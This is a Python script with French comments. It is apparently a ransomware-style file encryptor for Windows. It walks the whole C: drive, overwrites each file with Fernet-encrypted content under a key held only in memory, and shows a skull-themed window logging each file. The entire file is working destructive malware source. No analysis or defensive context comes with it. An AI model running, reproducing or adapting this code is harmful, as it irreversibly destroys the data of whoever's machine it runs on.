import glob, ctypes, threading, sys, os, time, pygame
from cryptography.fernet import Fernet

# Paramètres du cmd
pygame.init()
pygame.font.init()
os.system("@echo off")
os.system("title CRYPTING")
# os.system("cls")

# Var
res = (1500, 720)
green = (20, 148, 20)
skullhead = pygame.image.load("skullhead.png")
screen = pygame.display.set_mode(res, pygame.NOFRAME)
font = pygame.font.Font('Rasterman.ttf', 15)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
        

def PyGameWindow(): # Fonction de la fenêtre PyGame
    
    global textsurface
    
    h = 0 # On initialise la valeure qui va représenter le nm de pixel entre chaque ligne
    u = None
    textsurface = None
    while True:
        if u != textsurface: # Vérifier que le texte n'a pas déjà été affiché
            h += 30 # Ajouter 30 d'écart entre chaque ligne
            if h >= 1500: # Si la ligne dépasse la fenêtre
                screen.fill((0, 0, 0)) # Clear la fenêtre
                h = 10 # Remettre h à 10
            # Afficher les éléments sur l'écran
            screen.blit(skullhead, (1000, 0))
            screen.blit(textsurface, (0, h))
            u = textsurface
        pygame.display.update() # Mettre à jour la fenêtre


def SetBackgroundColor(): # Fonction pour bloquer la couleur de l'arrière-plan
    
    while True:
        os.system("color 4a")
        time.sleep(0.1)

class Crypt: # Classe pour le cryptage
    
    def __init__(self): # Se lance à l'initialisation de la classe
        
        self.key = Fernet.generate_key() # Génère une clé
        self.fernet = Fernet(self.key) # Initialiser le module Fernet

    def Crypting(self, file):
        
        global textsurface
        
        try:
            
            file = file.replace("\\", "/") # Remplacer les backslashs
            
            with open(file, 'rb') as f: # Stocker le contenu du fichier dans une variable
                original = f.read()
                
            encrypted = self.fernet.encrypt(original) # Crypter la variable
            
            with open(file, 'wb') as encrypted_file: # Remplacer le contenu du fichier par la variable cryptée
                encrypted_file.write(encrypted)
                textsurface = font.render(f'>   {file} : Ok', False, green) # Texte d'execution
            
        except: textsurface = font.render(f'>   {file} : Error', False, green) # Texte d'erreur


    def CryptFiles(self, path):
        
        while True:
        
            path += "/*" # Entrer dans le dossier
            folder = glob.glob(path) # Liste du contenu du dossier
            
            try:
                for file in folder: self.Crypting(file)
            except: pass
        
        
crypting = Crypt() # Créer une instance de la classe


if True: # Si l'utilisateur est administrateur
    
    # Threads
    set_background_color = threading.Thread(target=SetBackgroundColor)
    pygame_window = threading.Thread(target=PyGameWindow)
    paths = ["C:"]
    threads = [set_background_color, pygame_window] # Liste des threads
    for path in paths: print(path),  threads.append(threading.Thread(target=crypting.CryptFiles, args=(path,))) # Pour chaque chemin dans la liste charger la fonction de cryptage avec le chemin spécifié
    for thread in threads: thread.start()
    for thread in threads: thread.join()
    
    
else: # Sinon relancer le launcher en administrateur
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[0:]), None, 1)
